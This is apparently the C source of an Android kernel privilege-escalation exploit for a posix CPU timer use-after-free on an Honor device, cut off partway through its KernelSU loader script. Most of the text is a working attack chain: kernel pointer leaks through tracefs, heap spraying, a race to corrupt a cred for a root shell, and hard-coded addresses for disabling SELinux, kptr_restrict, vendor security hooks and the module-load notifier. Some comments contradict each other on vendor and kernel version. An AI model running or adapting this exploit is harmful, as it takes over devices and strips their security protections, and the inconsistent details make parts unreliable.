/*
 * CVE-2026-98260 - posix CPU timer UAF -> uid-0 shell
 *
 * Target : Honor WinRT "AAK-AN00" (port of the dada exploit)
 * Build  : 11.0.0.110 (SP5C00E110R102P2) / MagicOS 11.0 / Android 17
 * Kernel : 6.6.118-android15-8-g554929766a0d-abogki544555896-4k
 * SELinux: Enforcing (u:r:shell:s0)
 * Patches: the 6.6 android15-6.6 2026-07 branch still has
 *          exit_itimers()/posix_cpu_timers_exit() in fs/exec.c and no
 *          posixtimer_exec(), so the UAF is present.
 *
 * Chain (ported from woshigenm/CVE-2026-98260 uid0.c, MIT):
 *   1. leak the direct-map base and the victim k_itimer address V from the
 *      hidden kmem tracepoints via the per-CPU trace_pipe_raw files
 *      (raw records carry real pointers; /trace is hashed);
 *   2. spray 8 KiB AF_UNIX datagrams so the freed order-1 posix_timers_cache
 *      slab page is reclaimed with a payload that is all zeros except
 *      rb_left = S;
 *   3. reap the zombie -> cleanup_timerqueue() -> timerqueue_del() ->
 *      rb_erase() case 1-left writes [S] = 0 exactly once;
 *   4. S = cred + 8 of a child that exec'd this binary, i.e. a real private
 *      cred whose SELinux blob is valid. uid/gid become 0, then
 *      setresuid(0,0,0) + execve("/system/bin/sh").
 *
 * Nothing is written to any partition. Every unverified state parks the
 * process instead of reaping, because an uncontrolled rb_erase on the stale
 * node panics the kernel.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <poll.h>
#include <pthread.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/file.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include "ksu/ksyms_table.h"
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
#include <sys/utsname.h>
#include <linux/capability.h>

/* Minimal AIO ABI (linux/aio_abi.h) so the ring-page reclaim does not
 * depend on the NDK sysroot header. */
typedef unsigned long aio_context_t;
struct io_event {
	uint64_t data;
	uint64_t obj;
	int64_t res;
	int64_t res2;
};
struct aio_ring {
	unsigned id;
	unsigned nr;
	unsigned head;
	unsigned tail;
	unsigned magic;
	unsigned compat_features;
	unsigned incompat_features;
	unsigned header_length;
	struct io_event io_events[];
};

#define TR "/sys/kernel/tracing"
#define PAGE 4096UL
#define SOCKBUF 8192
#define SPRAY_THREADS 8
#define SPRAY_SOCKS 2048
#define SPRAY_PRE 2000
#define SPRAY_POST 10000
#define MAX_SOCKS 2048

/* Event ids on this exact build (calibrated on-device; see work/dada/). */
#define EV_CACHE_ALLOC 269
#define EV_CACHE_FREE 272
#define EV_PAGE_FREE 273
#define EV_PAGE_ALLOC 275
#define EV_PCPU_DRAIN 277

/* kmem_cache_alloc: type@0 pid@4 call_site@8 ptr@16 bytes_req@24 bytes_alloc@32
 * mm_page_alloc:   type@0 pid@4 pfn@8 order@16 gfp@24
 * mm_page_free:    type@0 pid@4 pfn@8 order@16 */
#define OFF_SITE 8
#define OFF_PTR 16
#define OFF_REQ 24
#define OFF_ALLOC 32
#define OFF_PFN 8
#define OFF_ORDER 16

/* struct k_itimer on this BTF: size 0x108, it.cpu at 0x78. */
#define ITIMER_SIZE 0x108
#define ITIMER_NODE 0x78
/* struct cpu_timer: node@0 head@0x20 pid@0x28 elist@0x30 firing@0x40
 * handling@0x48  =>  k_itimer + 0x98 / 0xa0 / 0xa8 / 0xb8 / 0xc0 */
#define ITIMER_HEAD (ITIMER_NODE + 0x20)
#define ITIMER_ELIST (ITIMER_NODE + 0x30)
#define ITIMER_FIRING (ITIMER_NODE + 0x40)
#define ITIMER_HANDLING (ITIMER_NODE + 0x48)
/* posix_timers_cache object size on this build: 264 bytes, order-1, 31/slab. */
#define TIMER_OBJ 0x108

/* posix_timers_cache is order-1 with 31 objects (264 B) per slab on this
 * build. SLUB keeps partially free slabs cached, so the victim's slab only
 * returns to the buddy allocator if it is genuinely empty *and* the cache has
 * no spare partial slabs. Padding timers fill the cache first, so the victim
 * lands in a slab that we then empty completely. */
#define PADDING_TIMERS (150 * 31)
#define NTIMERS 4096
#define VICTIM_IDX 2048
#define LOCKERS 3
#define VMA_COUNT 50000UL
#define HELPER_STACK (1UL << 20)

/* cred_jar on this build: bytes_req 0xb8, bytes_alloc 0xc0. */
#define CRED_REQ 0xb8
#define CRED_ALLOC 0xc0
#define CRED_SITE_LOW21 0xe5754UL	/* prepare_creds+0x20: BL+4 == _RET_IP_ */

/* ---- YuKongA fake-cred / KernelSU constants, re-derived for AAK-AN00 ----
 *
 * Link-time addresses decoded from this device's own boot image kallsyms
 * (6.6 BASE_RELATIVE layout, see tools/kallsyms_dump.py).
 * Field offsets come from the same image's BTF (see tools/btf_dump.py).
 * KASLR slide is measured at run time from the do_timer_create call site.
 */
/* do_timer_create+0x94: bl kmem_cache_alloc; _RET_IP_ = +0x94. */
#define STATIC_TIMER_SITE 0xffffffc080197fe4ULL	/* do_timer_create+0x94 */
#define TIMER_SITE_LOW21 0x197fe4UL

#define SELINUX_STATE_STATIC 0xffffffc08239a170ULL
#define KPTR_RESTRICT_STATIC 0xffffffc08215baf8ULL
#define PANIC_ON_WARN_STATIC 0xffffffc08214ac0cULL
#define ROOT_USER_STATIC 0xffffffc08216f108ULL
#define INIT_USER_NS_STATIC 0xffffffc08216ee78ULL
#define INIT_UCOUNTS_STATIC 0xffffffc082170bd8ULL
#define INIT_GROUPS_STATIC 0xffffffc082170668ULL

#define OFF_TASK_REAL_CRED 0x818
#define OFF_TASK_CRED 0x820ULL		/* BTF: task_struct.cred */
#define OFF_TASK_COMM 0x830ULL		/* BTF: task_struct.comm */
#define OFF_TASK_SECCOMP 0x8e8ULL	/* BTF: task_struct.seccomp (mode@+0) */
/* Measured on this device: copy_process() allocates the child's
 * task_struct from task_struct_cachep with bytes_req = bytes_alloc = 0x12c0,
 * and the kmem_cache_alloc_node call site is copy_process+0x144, so the
 * recorded _RET_IP_ low21 is 0x1cb240. */
#define TASK_ALLOC_LOW21 0xac790UL
#define TASK_ALLOC_BYTES 0x12c0ULL
#define TASK_ALLOC_ROUND 0x12c0ULL
#define CRED_UID_OFF 0x8ULL
#define SELINUX_BLOB_OFF 0x0ULL
#define SELINUX_SID_KERNEL 1U
/* vivo 6.6.127 tracepoints (from vmlinux kallsyms): tp->funcs is at tp+0x48.
 * Clearing it disables all probes on that tracepoint (vr.ko's sys_exit /
 * commit_creds hooks). */
#define TRACEPOINT_SYS_EXIT_STATIC 0xffffffc0822f3760ULL
#define TRACEPOINT_RVH_COMMIT_CREDS_STATIC 0xffffffc08230d6b0ULL
#define FULLCAP 0x1ffffffffffULL

/* struct blocking_notifier_head: rwsem @0x0 (0x40 bytes), head @0x40.
 * Zeroing the head skips the vivo hks notifier that returns -EPERM from
 * load_module's MODULE_STATE_COMING chain. */
#define MODULE_NOTIFY_LIST_STATIC 0xffffffc0821ec4a8ULL
#define MODULE_NOTIFY_HEAD_OFF 0x40ULL

/* Temporary-su daemon shipped with the GhostLock 64560 backend. The App checks
 * for it after the exploit exits, so the uid-0 shell hands root over to it. */
/* Temporary-su helper used only by the legacy shell/daemon modes. */
#define SU_PATH "/data/local/tmp/cve-64560-su"

#define CHILD_HELLO 0x52445931
#define CHILD_MAGIC 0x50474552

struct ev {
	unsigned type;
	int pid;
	uint64_t site, ptr, req, alloc;
	uint64_t pfn;
	unsigned order;
	uint64_t gfp;
};

struct child_report {
	int magic;
	int uid, euid;
	int setuid_ret, setuid_errno;
	int ruid, reuid, rsuid;
	unsigned long long caps;
};

static _Atomic int g_go, g_stop, g_locker_started, g_locker_cpu;
static _Atomic int g_exec_tid, g_target_tgid;
static void *g_frag_base;
static size_t g_frag_len;
static int g_ready_w = -1, g_ack_r = -1, g_tid_w = -1;
static int g_cpu;
static uint64_t g_base;
static int g_held;
static int g_rawfd[8];
static unsigned char *g_raw;
static size_t g_raw_cap;
static struct ev *g_evs;

static int g_logfd = -1;
static int g_child_nofix; /* own127: wait child runs in nofix mode */

static void logf(const char *fmt, ...)
{
	va_list ap, ap2;
	char line[1024];
	int n;

	va_start(ap, fmt);
	vprintf(fmt, ap);
	va_end(ap);
	(void)fflush(stdout);

	/* adb dies with the device on a panic, so keep a durable copy: the
	 * reboot is the only way to clean up, and we must be able to read the
	 * log afterwards. */
	if (g_logfd < 0) {
		g_logfd = open("/data/local/tmp/cve-2026-98260.log",
			       O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0644);
		if (g_logfd < 0)
			return;
	}
	va_start(ap2, fmt);
	n = vsnprintf(line, sizeof(line), fmt, ap2);
	va_end(ap2);
	if (n > 0) {
		if (n > (int)sizeof(line) - 1)
			n = (int)sizeof(line) - 1;
		(void)write(g_logfd, line, (size_t)n);
		(void)fsync(g_logfd);
	}
}

/* own127: log /proc/<pid>/status creds+state (child handshake diagnostics). */
static void dump_child_status(int pid, const char *tag)
{
	char path[64], line[256];
	FILE *f;

	snprintf(path, sizeof(path), "/proc/%d/status", pid);
	f = fopen(path, "r");
	if (!f) {
		logf("[childst] %s pid=%d open errno=%d\n", tag, pid, errno);
		return;
	}
	while (fgets(line, sizeof(line), f)) {
		if (!strncmp(line, "Uid:", 4) || !strncmp(line, "Gid:", 4) ||
		    !strncmp(line, "State:", 6)) {
			size_t n = strlen(line);

			while (n && (line[n - 1] == '\n' || line[n - 1] == '\r'))
				line[--n] = 0;
			logf("[childst] %s pid=%d %s\n", tag, pid, line);
		}
	}
	fclose(f);
}

/* own126: boot-relative time, for the hooks_defend load-race distribution. */
static double read_uptime(void)
{
	FILE *f = fopen("/proc/uptime", "r");
	double v = -1.0;

	if (f) {
		if (fscanf(f, "%lf", &v) != 1)
			v = -1.0;
		fclose(f);
	}
	return v;
}

static int wr(const char *path, const char *val)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC);
	ssize_t n;

	if (fd < 0)
		return -1;
	n = write(fd, val, strlen(val));
	close(fd);
	return n == (ssize_t)strlen(val) ? 0 : -1;
}

static void pin(int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	(void)sched_setaffinity(0, sizeof(set), &set);
}

static inline uint32_t u32(const unsigned char *b, size_t o)
{
	uint32_t v;

	memcpy(&v, b + o, 4);
	return v;
}

static inline uint64_t u64(const unsigned char *b, size_t o)
{
	uint64_t v;

	memcpy(&v, b + o, 8);
	return v;
}

static void enable_events(void)
{
	static const char *events[] = {
		"kmem_cache_alloc", "kmem_cache_free", "mm_page_alloc",
		"mm_page_free", "mm_page_pcpu_drain"
	};
	char cmd[96];

	for (size_t i = 0; i < sizeof(events) / sizeof(events[0]); i++) {
		snprintf(cmd, sizeof(cmd), "enable_event:kmem:%s", events[i]);
		(void)wr(TR "/events/kmem/rss_stat/trigger", cmd);
	}
	(void)wr(TR "/events/kmem/rss_stat/enable", "1");
	/* kmem_cache_alloc_node does not exist on the vivo 6.6.127 build;
	 * kmem_cache_alloc is the one the trigger-enabled set provides. */
	logf("[probe] kmem_cache_alloc enable=%d (node event absent)\n",
	     wr(TR "/events/kmem/kmem_cache_alloc/enable", "1"));
}

static void drain_cpu(int cpu)
{
	char path[128];
	unsigned char tmp[4096];
	int fd;

	snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
	fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
	if (fd < 0)
		return;
	while (read(fd, tmp, sizeof(tmp)) > 0)
		;
	close(fd);
}

static void trace_start(void)
{
	(void)wr(TR "/tracing_on", "0");
	(void)wr(TR "/trace", "");
	for (int c = 0; c < 8; c++)
		drain_cpu(c);
	enable_events();
	(void)wr(TR "/tracing_on", "1");
}

static void trace_stop(void) { (void)wr(TR "/tracing_on", "0"); }

static long read_cpu(int cpu, unsigned char *buf, size_t cap)
{
	char path[128];
	size_t total = 0;
	int fd;

	snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
	fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
	if (fd < 0)
		return -1;
	while (total < cap) {
		ssize_t n = read(fd, buf + total, cap - total);

		if (n <= 0)
			break;
		total += (size_t)n;
	}
	close(fd);
	return (long)total;
}

static void ensure_raw(void)
{
	for (int c = 0; c < 8; c++) {
		char path[128];

		if (g_rawfd[c] >= 0)
			continue;
		snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw",
			 c);
		g_rawfd[c] = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
	}
}

static long read_fd(int fd, unsigned char *buf, size_t cap)
{
	size_t total = 0;

	if (fd < 0)
		return 0;
	while (total < cap) {
		ssize_t n = read(fd, buf + total, cap - total);

		if (n <= 0)
			break;
		total += (size_t)n;
	}
	return (long)total;
}

static int parse_events(const unsigned char *b, size_t n, struct ev *out,
			int max)
{
	int cnt = 0;

	for (size_t base = 0; base + 16 <= n; base += PAGE) {
		uint64_t commit = u64(b, base + 8);
		size_t o, end;

		if (!commit || commit > PAGE)
			continue;
		o = base + 16;
		end = base + 16 + commit;
		if (end > base + PAGE)
			end = base + PAGE;
		while (o + 4 <= end) {
			uint32_t hdr = u32(b, o);
			unsigned type_len = hdr & 31;
			unsigned time_delta = hdr >> 5;
			size_t total, p;
			int is_data = 0;
			unsigned type;

			if (type_len == 29) {
				if (!time_delta)
					break;
				total = 4 + u32(b, o + 4);
			} else if (type_len == 30 || type_len == 31) {
				total = 8;
			} else if (type_len == 0) {
				total = 4 + u32(b, o + 4);
				is_data = 1;
			} else {
				total = 4 + type_len * 4;
				is_data = 1;
			}
			if (total < 4)
				break;
			p = o + (type_len == 0 ? 8 : 4);
			if (is_data && p + 8 <= end && cnt < max) {
				type = u32(b, p) & 0xffff;
				if (type == EV_CACHE_ALLOC) {
					struct ev *e = &out[cnt];

					if (p + OFF_ALLOC + 8 > end)
						goto next;
					e->type = type;
					e->pid = (int)u32(b, p + 4);
					e->site = u64(b, p + OFF_SITE);
					e->ptr = u64(b, p + OFF_PTR);
					e->req = u64(b, p + OFF_REQ);
					e->alloc = u64(b, p + OFF_ALLOC);
					cnt++;
				} else if (type == EV_CACHE_FREE) {
					struct ev *e = &out[cnt];

					if (p + OFF_PTR + 8 > end)
						goto next;
					e->type = type;
					e->pid = (int)u32(b, p + 4);
					e->site = u64(b, p + OFF_SITE);
					e->ptr = u64(b, p + OFF_PTR);
					cnt++;
				} else if (type == EV_PAGE_ALLOC) {
					struct ev *e = &out[cnt];

					if (p + OFF_ORDER + 8 > end)
						goto next;
					e->type = type;
					e->pid = (int)u32(b, p + 4);
					e->pfn = u64(b, p + OFF_PFN);
					e->order = u32(b, p + OFF_ORDER);
					e->gfp = u64(b, p + 32);
					cnt++;
				} else if (type == EV_PAGE_FREE ||
					   type == EV_PCPU_DRAIN) {
					struct ev *e = &out[cnt];

					if (p + OFF_ORDER + 4 > end)
						goto next;
					e->type = type;
					e->pid = (int)u32(b, p + 4);
					e->pfn = u64(b, p + OFF_PFN);
					e->order = u32(b, p + OFF_ORDER);
					cnt++;
				}
			}
next:
			o += total;
		}
	}
	return cnt;
}

/* Slurp every per-CPU ring into g_raw and parse it. */
static int harvest(struct ev *evs, int max)
{
	size_t total = 0;

	for (int c = 0; c < 8 && total < g_raw_cap; c++) {
		long n = read_cpu(c, g_raw + total, g_raw_cap - total);

		if (n > 0)
			total += (size_t)n;
	}
	if (!total)
		return 0;
	return parse_events(g_raw, total, evs, max);
}

static int is_kernel_ptr(uint64_t v) { return (v >> 48) == 0xffff; }

/* task_struct_cachep allocation by copy_process() in our own pid: the trace
 * record identifies both the pointer and the call site, so the fake-cred
 * stage can find `current`'s task_struct without any kallsyms access. */
static uint64_t scan_task_allocs(struct ev *evs, int n, int pid)
{
	uint64_t out = 0;

	for (int i = 0; i < n; i++) {
		if (evs[i].type != EV_CACHE_ALLOC || evs[i].pid != pid)
			continue;
		if ((evs[i].site & 0x1fffff) != TASK_ALLOC_LOW21)
			continue;
		if (evs[i].req != TASK_ALLOC_BYTES ||
		    evs[i].alloc != TASK_ALLOC_BYTES)
			continue;
		if (!is_kernel_ptr(evs[i].ptr))
			continue;
		out = evs[i].ptr;
	}
	return out;
}


/* Touch and drop 32 MiB of anon memory so the buddy allocator issues a few
 * order-1 allocations; calibrate_base() needs them to pair slab pointers with
 * pfns. */
static void prime_allocator(void)
{
	size_t n = 32u << 20;
	char *p = mmap(NULL, n, PROT_READ | PROT_WRITE,
		       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	if (p == MAP_FAILED)
		return;
	for (size_t i = 0; i < n; i += PAGE)
		p[i] = 1;
	munmap(p, n);
}

/* Pair order-1 page allocs with posix_timers_cache allocs to recover the
 * direct-map base.  Both carry slide-independent low bits, so a single pass
 * with a vote is enough. */
static uint64_t calibrate_base(struct ev *evs)
{
	uint64_t hist[64] = { 0 };
	int hist_n[64] = { 0 };
	uint64_t recent[32] = { 0 };
	int rn = 0, hc = 0, best = 0, best_n = 0, cnt;
	uint64_t best_base = 0;
	struct sigevent ev;

	prime_allocator();
	trace_start();
	memset(&ev, 0, sizeof(ev));
	ev.sigev_notify = SIGEV_NONE;
	for (int i = 0; i < 512; i++) {
		timer_t t;

		if (timer_create(CLOCK_MONOTONIC, &ev, &t))
			break;
	}
	usleep(5000);
	trace_stop();
	cnt = harvest(evs, 300000);
	{
		int n1 = 0, nt = 0;

		for (int i = 0; i < cnt; i++) {
			if (evs[i].type == EV_PAGE_ALLOC && evs[i].order == 1)
				n1++;
			if (evs[i].type == EV_CACHE_ALLOC &&
			    evs[i].req == TIMER_OBJ && evs[i].alloc == TIMER_OBJ)
				nt++;
		}
		logf("[base] recs=%d order1_pages=%d timer_allocs=%d\n", cnt, n1,
		     nt);
	}
	for (int i = 0; i < cnt; i++) {
		if (evs[i].type == EV_PAGE_ALLOC && evs[i].order == 1) {
			if (rn < 32) {
				recent[rn++] = evs[i].pfn;
			} else {
				memmove(recent, recent + 1, 31 * sizeof(*recent));
				recent[31] = evs[i].pfn;
			}
		} else if (evs[i].type == EV_CACHE_ALLOC &&
			   evs[i].req == TIMER_OBJ &&
			   evs[i].alloc == TIMER_OBJ && rn) {
			uint64_t slab = evs[i].ptr & ~0x1fffULL;

			for (int j = 0; j < rn; j++) {
				uint64_t b = slab - (recent[j] << 12);
				int f = 0;

				if (!is_kernel_ptr(b))
					continue;
				for (int k = 0; k < hc; k++)
					if (hist[k] == b) {
						hist_n[k]++;
						f = 1;
						break;
					}
				if (!f && hc < 64) {
					hist[hc] = b;
					hist_n[hc] = 1;
					hc++;
				}
			}
		}
	}
	for (int k = 0; k < hc; k++)
		if (hist_n[k] > best_n) {
			best_n = hist_n[k];
			best = k;
		}
	best_base = hist_n[best] >= 4 ? hist[best] : 0;
	logf("[base] candidates=%d best=%#llx votes=%d\n", hc,
	     (unsigned long long)best_base, best_n);
	return best_base;
}

static int prepare_fragmented_range(void)
{
	size_t len = (size_t)VMA_COUNT * PAGE;
	int fd = (int)syscall(SYS_memfd_create, "vma-page", 1);
	void *base;

	if (fd < 0 || ftruncate(fd, PAGE))
		return -1;
	base = mmap(NULL, len, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (base == MAP_FAILED) {
		close(fd);
		return -1;
	}
	for (unsigned long i = 0; i < VMA_COUNT; i++) {
		void *want = (char *)base + i * PAGE;

		if (mmap(want, PAGE, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) !=
		    want) {
			close(fd);
			return -1;
		}
	}
	close(fd);
	g_frag_base = base;
	g_frag_len = len;
	return 0;
}

static int locker_fn(void *x)
{
	int prot = PROT_NONE;
	unsigned slot = (unsigned)atomic_fetch_add(&g_locker_cpu, 1);

	(void)x;
	pin(slot ? 3 : 1);
	while (!atomic_load(&g_go))
		sched_yield();
	atomic_fetch_add(&g_locker_started, 1);
	while (!atomic_load(&g_stop)) {
		(void)syscall(SYS_mprotect, g_frag_base, g_frag_len, prot);
		prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
	}
	_exit(0);
}

static int killer_fn(void *x)
{
	int tid, tgid;

	(void)x;
	pin(2);
	while (!(tid = atomic_load(&g_exec_tid)))
		sched_yield();
	tgid = atomic_load(&g_target_tgid);
	for (;;) {
		long r = syscall(SYS_tgkill, tgid, tid, 0);

		if (r < 0 && errno == ESRCH)
			break;
		sched_yield();
	}
	(void)syscall(SYS_tgkill, tgid, tgid, SIGKILL);
	atomic_store(&g_stop, 1);
	_exit(0);
}

static int spawn_vm_helper(int (*fn)(void *))
{
	void *st = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
			MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	int p;

	if (st == MAP_FAILED)
		return -1;
	p = clone(fn, (char *)st + HELPER_STACK, CLONE_VM | SIGCHLD, NULL);
	if (p < 0)
		munmap(st, HELPER_STACK);
	return p;
}

/* Fill posix_timers_cache with live objects so a fresh slab (and therefore a
 * new order-1 page) has to be created for the victim. Returns the number of
 * padding timers actually created; the caller must delete them after the
 * victim has been forked. */
static int create_slab_padding(timer_t *ids, int max)
{
	struct sigevent ev;
	int made = 0;

	memset(&ev, 0, sizeof(ev));
	ev.sigev_notify = SIGEV_NONE;
	for (int i = 0; i < max; i++) {
		if (timer_create(CLOCK_MONOTONIC, &ev, &ids[i]))
			break;
		made++;
	}
	return made;
}

static void delete_slab_padding(timer_t *ids, int n)
{
	for (int i = 0; i < n; i++)
		(void)timer_delete(ids[i]);
}

/* /proc/slabinfo is readable by the shell on the vivo build (unlike
 * /sys/kernel/slab), so use it as the SLUB discard oracle, like the X500
 * chain's "[slab] %s active=%u total=%u" step. */
static void slab_timers(int *active, int *total)
{
	FILE *f;
	char line[256];

	*active = -1;
	*total = -1;
	f = fopen("/proc/slabinfo", "r");
	if (!f)
		return;
	while (fgets(line, sizeof(line), f)) {
		unsigned a, t;

		if (!strncmp(line, "posix_timers_cache", 18) &&
		    sscanf(line, "%*s %u %u", &a, &t) == 2) {
			*active = (int)a;
			*total = (int)t;
			break;
		}
	}
	fclose(f);
}

/* Safe pre-flight, X500 style: verify the oracles we depend on before any
 * UAF plant. If the environment is not the expected one, bail out cleanly
 * instead of walking into a wild write + panic. */
static int preflight(void)
{
	int sa, st, ok = 1;
	FILE *f;

	slab_timers(&sa, &st);
	logf("[preflight] posix_timers_cache active/total=%d/%d\n", sa, st);
	if (sa < 0 || st <= 0) {
		logf("[preflight] slabinfo oracle unavailable\n");
		ok = 0;
	}
	f = fopen("/sys/kernel/tracing/tracing_on", "r");
	if (f) {
		char b[8] = {0};

		(void)!fread(b, 1, sizeof(b) - 1, f);
		fclose(f);
		logf("[preflight] tracing_on=%s", b);
	} else {
		logf("[preflight] tracefs not accessible\n");
		ok = 0;
	}
	/* tracefs event files have unusual access(2)/fopen semantics here
	 * (access(W_OK) is denied while the write actually succeeds), and the
	 * check mode's enable_events()+calibrate_base() already prove the
	 * trace path works, so do not gate on the event files. */
	logf("[preflight] %s\n", ok ? "PASS" : "FAIL");
	return ok;
}

/* Probe the AIO ring path used by the reclaim: io_setup() gives a
 * user-mapped kernel page (find_or_create_page GFP_USER|__GFP_ZERO), which
 * is exactly what the order-0 half-page reclaim needs. */
static void aio_probe(void)
{
	aio_context_t ctx = 0;
	long r;

	errno = 0;
	r = syscall(__NR_io_setup, 1, &ctx);
	logf("[check] io_setup=%ld errno=%d ctx=%#llx\n", r, errno,
	     (unsigned long long)ctx);
	if (r == 0) {
		volatile unsigned char *p = (volatile unsigned char *)(uintptr_t)ctx;
		unsigned char old = p[0x100];

		p[0x100] = 0x5a;
		logf("[check] aio page write=%s\n",
		     p[0x100] == 0x5a ? "ok" : "fail");
		p[0x100] = old;
		(void)syscall(__NR_io_destroy, ctx);
	}
}

/* The victim timer has to belong to a non-leader thread, and its task must be
 * the one whose posix_cputimers queue keeps the stale node. Timer index
 * VICTIM_IDX is the one that stays armed, so its k_itimer address is later
 * used as V. */
static void *exec_thread(void *x)
{
	struct sigevent ev_none, ev_victim;
	struct itimerspec dormant;
	char b = 'R', ack;
	char *const argv[] = { (char *)"", NULL };
	char *const envp[] = { NULL };

	(void)x;
	pin(2);
	if (prctl(PR_SET_NAME, "timer-exec", 0, 0, 0))
		_exit(119);
	memset(&ev_none, 0, sizeof(ev_none));
	ev_none.sigev_notify = SIGEV_NONE;
	memset(&ev_victim, 0, sizeof(ev_victim));
	ev_victim.sigev_notify = SIGEV_SIGNAL;
	ev_victim.sigev_signo = SIGRTMIN;
	memset(&dormant, 0, sizeof(dormant));
	dormant.it_value.tv_sec = 3600;

	if (write(g_ready_w, &b, 1) != 1)
		_exit(117);
	if (read(g_ack_r, &ack, 1) != 1)
		_exit(118);

	for (int i = 0; i < NTIMERS; i++) {
		timer_t t;
		struct sigevent *e = (i == VICTIM_IDX) ? &ev_victim : &ev_none;

		if (timer_create(CLOCK_THREAD_CPUTIME_ID, e, &t))
			_exit(120);
		if (i == VICTIM_IDX && timer_settime(t, 0, &dormant, NULL))
			_exit(121);
	}
	{
		int tid = (int)syscall(SYS_gettid);

		atomic_store(&g_exec_tid, tid);
		if (write(g_tid_w, &tid, sizeof(tid)) != sizeof(tid))
			_exit(122);
	}
	atomic_store(&g_go, 1);
	while (atomic_load(&g_locker_started) < LOCKERS)
		sched_yield();
	for (volatile unsigned long i = 0; i < 5000000UL; i++)
		__asm__ volatile("" ::: "memory");
	/* Fails: the mprotect() write lock on the fragmented range makes
	 * exec_mmap()'s mmap_read_lock_killable() return -EINTR. */
	execve("/proc/self/exe", argv, envp);
	_exit(123);
}

static void run_target(void)
{
	pthread_t th;
	sigset_t set;

	atomic_store(&g_target_tgid, (int)getpid());
	pin(2);
	if (prepare_fragmented_range())
		_exit(110);
	for (int i = 0; i < LOCKERS; i++)
		if (spawn_vm_helper(locker_fn) < 0)
			_exit(111);
	if (spawn_vm_helper(killer_fn) < 0)
		_exit(112);
	sigemptyset(&set);
	sigaddset(&set, SIGRTMIN);
	pthread_sigmask(SIG_BLOCK, &set, NULL);
	if (pthread_create(&th, NULL, exec_thread, NULL))
		_exit(114);
	for (;;)
		sched_yield();
}

static int wait_zombie(pid_t pid, siginfo_t *si)
{
	struct timespec pause = { .tv_nsec = 10000000 };

	for (int i = 0; i < 400; i++) {
		memset(si, 0, sizeof(*si));
		if (waitid(P_PID, (id_t)pid, si, WEXITED | WNOHANG | WNOWAIT))
			return -1;
		if (si->si_pid == pid)
			return 0;
		nanosleep(&pause, NULL);
	}
	return -1;
}

/* MODE_ZERO clears the erase target, MODE_PTR writes the stale node's own
 * address (used to seed cap_effective during bring-up), MODE_FAKE plants a
 * full fake cred over the reclaimed page. */
enum payload_mode { MODE_ZERO = 0, MODE_PTR = 1, MODE_FAKE = 2, MODE_BLOB = 3 };

static uint64_t g_fake_A;
static unsigned long long g_slide_lock; /* verified slide, never overwritten by plants */
/* Resolved by write_ksu_script() from /data/app so the worker can exec the
 * KernelSU libksud.so directly instead of going through /system/bin/sh. */
static char g_ksud_path[512];

struct plant_res {
	uint64_t V, A, slab_pfn;
	int exact;
	int ok;
	int retry;
};

static void run_plant(uint64_t target, int tag, struct plant_res *res,
		      int selftest, int mode);

/* The Kotlin layer resolves a manager package + libksud.so and passes them in
 * GHOSTLOCK_KSU_PKG / GHOSTLOCK_KSUD. KernelSU, SukiSU-Ultra, ReSukiSU/BakaSU,
 * KernelSU-Next, FinaSU and repackaged forks all ship the same libksud.so
 * contract, differing only by package id, so the script discovers one at run
 * time when the environment is empty. */
static const char *ksu_env(const char *name)
{
	const char *v = getenv(name);

	return (v && v[0]) ? v : "";
}

/* Escape a value for a single-quoted shell literal: ' -> '\''. */
static void shell_escape(const char *in, char *out, size_t cap)
{
	size_t o = 0;

	if (cap == 0)
		return;
	for (; *in; in++) {
		if (*in == '\'') {
			if (o + 5 > cap)
				break;
			out[o++] = '\'';
			out[o++] = '\\';
			out[o++] = '\'';
			out[o++] = '\'';
		} else {
			if (o + 2 > cap)
				break;
			out[o++] = *in;
		}
	}
	out[o] = '\0';
}

/* YuKongA's final stage, adapted to this device's KMI. It resolves any
 * installed KernelSU-family manager's libksud.so and late-loads the matching
 * module; nothing here re-implements KernelSU. */
/* GhostLock-style dynamic KMI: android15-6.6 from
 * "6.6.127-android15-8-g...-abogki...-4k". */
static char g_kmi[32] = "android15-6.6";

static void compute_kmi(void)
{
	struct utsname u;
	char av[24] = "";
	const char *p;

	if (uname(&u))
		return;
	p = strstr(u.release, "android");
	if (p) {
		size_t i = 0;

		while (p[i] && i + 1 < sizeof(av) &&
		       ((p[i] >= 'a' && p[i] <= 'z') ||
			(p[i] >= '0' && p[i] <= '9')))
			av[i] = p[i], i++;
		av[i] = 0;
	}
	{
		int a = 0, b = 0;

		if (sscanf(u.release, "%d.%d", &a, &b) == 2) {
			if (av[0])
				snprintf(g_kmi, sizeof(g_kmi), "%s-%d.%d", av,
					 a, b);
			else
				snprintf(g_kmi, sizeof(g_kmi), "android15-%d.%d",
					 a, b);
		}
	}
}

static void write_ksu_script(void)
{
	static const char fmt[] =
		"#!/system/bin/sh\n"
		"echo \"[ksu] script-start uid=$(id -u) selinux=$(getenforce)\"\n"
		"if ! exec >/data/local/tmp/ksu2.out 2>&1; then exec >/dev/null 2>&1; fi\n"
		"echo \"[ksu] start uid=$(id -u) selinux=$(getenforce)\"\n"
		"grep -E '^(Cap|Seccomp)' /proc/self/status\n"
		"echo \"[ksu] uidline: $(grep -E '^Uid:' /proc/self/status)\"\n"
		"ls -lZ /proc/sys/kernel/kptr_restrict 2>&1\n"
